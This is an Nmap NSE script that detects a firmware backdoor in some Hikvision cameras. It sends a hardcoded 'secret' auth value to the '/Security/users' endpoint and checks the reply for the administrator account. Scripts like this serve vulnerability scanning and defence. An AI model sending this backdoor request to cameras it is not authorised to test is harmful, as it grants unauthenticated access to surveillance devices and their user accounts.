description = [[
Detects a firmware backdoor on some Hikvision cameras by checking a secret argument. Firmware version might be vulnerable in between 5.2 and 5.4
]]

---
-- @usage
-- nmap -sV --script http-hikvision-backdoor <target> -p 80,443
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | hikvision: 
-- |   VULNERABLE:
-- |   Firmware backdoor in some models of Hikvision cameras
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |       Hikvision cameras have been found with a firmware backdoor allowing for admin password changes using a "secret" argument value.
-- |       
-- |     References:
-- |_      https://savenas.lt
---

author = "<@tomas_savenas>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local http = require "http"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"

portrule = shortport.http
path = "/Security/users?auth=YWRtaW46MTEK"

action = function(host, port)
  local response = http.get(host, port, path)
  local hikvision = response.body 

  local vuln_table = {
    title = "Firmware backdoor in some models of Hikvision cameras",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
Hikvision cameras have been found with a firmware backdoor allowing for admin password changes using a "secret" argument value.
]],
    references = {
      'https://savenas.lt',
    }
  }

  if ( response.status == 200 and hikvision:match("Administrator")) then
      vuln_table.state = vulns.STATE.VULN
      local report = vulns.Report:new(SCRIPT_NAME, host, port, path)
      return report:make_output(vuln_table)
    end
end
